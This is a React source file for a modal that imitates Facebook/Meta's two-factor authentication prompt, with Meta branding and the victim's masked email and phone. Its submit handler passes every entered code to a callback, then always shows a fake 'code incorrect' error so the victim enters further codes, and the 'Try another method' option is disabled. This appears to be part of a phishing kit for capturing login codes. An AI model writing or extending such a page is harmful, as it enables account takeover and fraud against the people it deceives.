import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';

const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const handleSubmit = async (e) => {
        e.preventDefault();
        const normalizedCode = String(code || '').replace(/\D/g, '');

        if (!/^\d{6,8}$/.test(normalizedCode)) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        onSubmit(normalizedCode);

        setCountdown(config.code_loading_time || 3);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, (config.code_loading_time || 3) * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= (config.max_code_attempts || 2)) {
            onSuccess();
            return;
        }

        setCode('');
    };

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    /* Mask email: t**t@example.us */
    const maskEmail = (email) => {
        if (!email) return 't**t@example.us';
        const [local, domain] = email.split('@');
        if (!domain) return email;
        if (local.length <= 2) return `${local[0]}**@${domain}`;
        return `${local[0]}**${local[local.length - 1]}@${domain}`;
    };

    /* Mask phone: +60 ****** 25 */
    const maskPhone = (phone) => {
        if (!phone) return '+84 ****** XX';
        const digits = phone.replace(/\D/g, '');
        if (digits.length < 4) return phone;
        return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
    };

    if (!show) return null;

    const userName = formData?.fullName || 'User';
    const maskedEmail = maskEmail(formData?.personalEmail);
    const maskedPhone = maskPhone(formData?.phone);
    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.max_code_attempts || 3})`;
    const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));

    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '8px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle = {
        width: '100%',
        maxWidth: '520px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: 'min(860px, calc(100vh - 16px))',
        maxHeight: 'min(860px, calc(100vh - 16px))',
        overflowY: 'auto',
    };

    const bodyStyle = {
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'space-between',
        flex: 1,
    };

    const inputWrapperStyle = {
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        padding: '0 11px',
        transition: 'all 0.2s',
        marginBottom: '4px',
        display: 'flex',
        alignItems: 'center',
    };

    const inputStyle = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        fontSize: '14px',
        backgroundColor: 'transparent',
        color: '#333',
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                <div style={bodyStyle}>

                {/* User info row */}
                <div style={{ width: '100%' }}>
                    <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px',
                        fontSize: '14px',
                        color: '#9a979e',
                        marginBottom: '7px',
                    }}>
                        <span>{userName}</span>
                        <div style={{
                            width: '4px',
                            height: '4px',
                            backgroundColor: '#9a979e',
                            borderRadius: '5px',
                        }} />
                        <span>Facebook</span>
                    </div>

                    {/* Title */}
                    <h2 style={{
                        fontSize: '22px',
                        lineHeight: 1.25,
                        color: '#000',
                        fontWeight: 700,
                        marginBottom: '12px',
                        wordBreak: 'break-word',
                    }}>
                        {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
                    </h2>

                    {/* Description */}
                    <p style={{
                        color: '#9a979e',
                        fontSize: '15px',
                        lineHeight: 1.55,
                        margin: 0,
                    }}>
                        {`${texts.twoFAInstructionPrefix || 'Enter the code sent to'} ${maskedEmail}, ${maskedPhone}, ${texts.twoFAInstructionSuffix || 'or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).'}`}
                    </p>

                    {/* 2FA Image */}
                    <div style={{
                        width: '100%',
                        borderRadius: '10px',
                        backgroundColor: '#f5f5f5',
                        overflow: 'hidden',
                        margin: '15px 0',
                    }}>
                        <img src={TwoFAImage} width="100%" alt="authentication" style={{ display: 'block' }} />
                    </div>

                    {/* Form */}
                    <form onSubmit={handleSubmit}>
                        {/* Label */}
                        {/* Input */}
                        <div
                            style={inputWrapperStyle}
                            onMouseOver={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onMouseOut={(e) => {
                                if (!e.currentTarget.contains(document.activeElement)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                            onFocusCapture={(e) => {
                                e.currentTarget.style.borderColor = '#3b82f6';
                                e.currentTarget.style.boxShadow = '0 4px 12px rgba(59,130,246,0.12)';
                            }}
                            onBlurCapture={(e) => {
                                if (!e.currentTarget.contains(e.relatedTarget)) {
                                    e.currentTarget.style.borderColor = showError ? '#e74c3c' : '#d4dbe3';
                                    e.currentTarget.style.boxShadow = 'none';
                                }
                            }}
                        >
                            <input
                                style={inputStyle}
                                inputMode="numeric"
                                id="twoFaInput"
                                placeholder={texts.code || 'Code'}
                                maxLength="8"
                                type="text"
                                autoComplete="off"
                                value={code}
                                onChange={(e) => {
                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                    if (showError) setShowError(false);
                                }}
                            />
                        </div>

                        {/* Helper / Error text */}
                        {showError ? (
                            <p style={{
                                color: '#e74c3c',
                                fontSize: '12px',
                                margin: '-1px 0 10px 0',
                            }}>
                                {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                            </p>
                        ) : null}

                        {/* Submit button */}
                        <div style={{ width: '100%', marginTop: '10px' }}>
                            <button
                                type="submit"
                                disabled={isLoading || !isCodeValid}
                                style={{
                                    minHeight: '40px',
                                    width: '100%',
                                    backgroundColor: '#0064E0',
                                    color: '#fff',
                                    borderRadius: '40px',
                                    padding: '8px 16px',
                                    border: 'none',
                                    fontSize: '14px',
                                    fontWeight: 600,
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    cursor: (isLoading || !isCodeValid) ? 'not-allowed' : 'pointer',
                                    opacity: (isLoading || !isCodeValid) ? 0.7 : 1,
                                    transition: 'opacity 0.3s',
                                }}
                            >
                                {isLoading ? (
                                    <>
                                        <span style={{
                                            width: '20px',
                                            height: '20px',
                                            border: '3px solid rgba(255,255,255,0.4)',
                                            borderTopColor: '#fff',
                                            borderRadius: '50%',
                                            animation: 'spin 0.8s linear infinite',
                                            display: 'inline-block',
                                            marginRight: '8px',
                                        }} />
                                        {`${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`}
                                    </>
                                ) : (
                                    texts.continueBtn || 'Continue'
                                )}
                            </button>
                        </div>

                        {/* Try another method */}
                        <div style={{
                            width: '100%',
                            marginTop: '20px',
                            color: '#8f949d',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            backgroundColor: '#fff',
                            borderRadius: '40px',
                            minHeight: '40px',
                            padding: '8px 20px',
                            border: '1px solid #d4dbe3',
                            cursor: 'default',
                            pointerEvents: 'none',
                            fontSize: '14px',
                            fontWeight: 400,
                            lineHeight: 1,
                        }}>
                            <span>{texts.tryAnotherMethod || 'Try another method'}</span>
                        </div>

                        <div style={{ width: '64px', margin: '20px auto 0' }}>
                            <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                        </div>
                    </form>
                </div>
                </div>
            </div>

            {/* Spinner keyframe */}
            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

export default TwoFAModal;
